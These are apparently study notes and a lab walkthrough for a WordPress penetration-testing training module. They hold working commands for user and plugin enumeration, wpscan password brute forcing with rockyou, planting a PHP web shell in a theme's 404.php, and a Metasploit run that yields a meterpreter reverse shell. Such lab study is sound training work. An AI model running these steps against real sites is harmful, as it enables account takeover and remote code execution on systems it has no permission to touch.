# Hacking WordPress

1. [Intro](#intro)
1. [Enumeration](#enumeration)
1. [Exploitation](#exploitation)
1. [Skills Assessment](#skills-assessment)

## Intro

* WordPress - most popular CMS (Content Management System) - mostly used as a WYSIWYG editor

* After installation, all WordPress related files in Linux systems will be found in webroot at ```/var/www/html```

* Key WP files:

  * ```index.php```
  * ```license.txt```
  * ```wp-activate.php```
  * ```/wp-admin/login.php```, ```/wp-admin/wp-login.php```, ```login.php```, or ```wp-login.php``` (one of these files act as the admin login page)
  * ```xmlrpc.php```
  * ```wp-config.php```

* Key WP directories:

  * ```wp-content```
  * ```wp-includes```

* WP user roles - admin, editor, author, contributor and subscriber

## Enumeration

* WP core version:

  * search for ```meta generator``` tag in source code:

    ```shell
    curl -s -X GET http://blog.inlanefreight.com | grep '<meta name="generator"'
    ```
  
  * check for links to CSS and JS

  * in older WP versions, ```readme.html``` in root directory can be viewed

* Plugins & themes:

  ```shell
  # enum plugins
  curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins/*' | cut -d"'" -f2

  # enum themes
  curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'themes' | cut -d"'" -f2

  # active plugin enum
  curl -I -X GET http://blog.inlanefreight.com/wp-content/plugins/someplugin
  # if plugin does not exist, we will get 404 error
  # anything other than that means plugin exists
  # similarly we can enumerate themes

  # we can automate active plugin/theme enum using fuzzing tools
  ```

* Directory indexing:

  * even if plugin is deactivated, it can still be accessed; best practice is to either remove unused plugins or keep plugins up-to-date

  * if we browse to plugins directory at ```http://website.com/wp-content/plugins/mail-masta```, we still have access to that plugin; best practice to disable directory indexing on web servers

* User enumeration:

  * from posts, we can get username and the corresponding ID; the link to user profile will be under ```/author```:

    ```shell
    curl -s -I -X GET http://blog.inlanefreight.com/?author=1
    # where 1 is the user id
    # if the user exists, we will get username in the Location header URL
    # if the user does not exist, we get a 404 error
    ```
  
  * for WP versions < 4.7.1, we can interact with the JSON endpoint to get users list:

    ```shell
    curl http://blog.inlanefreight.com/wp-json/wp/v2/users | jq
    ```

* Login:

  * once we have list of valid users, we can do a brute-force attack via the login page or the ```xmlrpc.php``` page

    ```shell
    curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php
    # if the creds are valid, we get a response with several params
    # if creds are invalid, we get a 403 Forbidden response
    ```

* [wpscan](https://github.com/wpscanteam/wpscan):

  * automated WP scanner and enumeration tool

    ```shell
    wpscan -hh
    # help menu

    wpscan --url http://94.237.54.50:50176 --enumerate
    # enumerate WP site
    # use '--enumerate ap' to enumerate all plugins

    # --api-token param can be used if we have account on WPVulnDB
    # to get vuln info from external sources
    ```

## Exploitation

* From the ```wpscan``` results, we can see vulnerable plugins like ```Mail Masta, 1.0``` and ```Google Review Slider 6.1``` have been found.

* Based on the scan results, we can search for exploits related to these plugin versions; for example, [Mail Masta 1.0 LFI exploit](https://www.exploit-db.com/exploits/40290).

* Attacking users:

  ```shell
  wpscan --url http://94.237.62.195:33535 --enumerate u
  # enumerate users

  # wpscan uses 2 login brute force methods - xmlrpc and wp-login
  # xmlrpc is faster

  wpscan --url http://94.237.62.195:33535 --password-attack xmlrpc -t 20 -U roger -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
  # bruteforce attack against 'roger'
  # multiple users can be specified
  ```

* With admin access to WP, we can modify PHP source code to get RCE - after logging into WP as admin, navigate to Appearance > Theme Editor - select an inactive/unused theme, and choose a non-critical file like ```404.php``` to modify and add a PHP web shell.

* For example, we can edit the ```404.php``` file with "twentyseventeen" theme and include the PHP basic webshell code ```system($_GET['cmd']);``` in the source code for the page; then we get RCE using ```curl -X GET "http://website.com/wp-content/themes/twentyseventeen/404.php?cmd=id"```

* We can attempt for a reverse shell using Metasploit as well:

  ```shell
  msfconsole

  search wp_admin
  # search for the wp_admin_shell_upload module

  use 0

  options
  # view all options
  
  set rhosts blog.inlanefreight.com

  set lhost tun0

  set username admin

  set password sunshine1
  # we need valid creds for an account with permissions to create files on server

  # after setting options
  run
  # get meterpreter shell
  ```

## Skills Assessment

  ```shell
  # for the webpage, we can see that the domain inlanefreight.local is being used
  # furthermore, we have a blog page at blog.inlanefreight.local
  # we can map both of these to the IP in /etc/hosts
  sudo vim /etc/hosts

  # now we can visit blog.inlanefreight.local
  # it is running WP

  wpscan --url http://blog.inlanefreight.local --enumerate ap
  # enum all plugins
  # this also shows us directories with directory listing enabled

  wpscan --url http://blog.inlanefreight.local --enumerate u
  # enum users

  # we can exploit the email-subscribers 4.2.2 plugin for unauthenticated downloads
  # we can also exploit the site-editor 1.1.1 plugin for LFI

  # we can attempt to brute force users
  wpscan --url http://blog.inlanefreight.local --password-attack xmlrpc -t 20 -U erika -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
  # this gives us a valid password

  # login to the dashboard with the valid creds
  # and navigate to theme editor

  # add a basic PHP webshell code to an unused theme's 404 page
  # then we can get RCE using curl
  curl -X GET "http://blog.inlanefreight.local/wp-content/themes/twentysixteen/404.php?cmd=id"

  curl -X GET "http://blog.inlanefreight.local/wp-content/themes/twentysixteen/404.php?cmd=ls%20%2Fhome%2Ferika"
  # URL encode the command to avoid errors
  ```
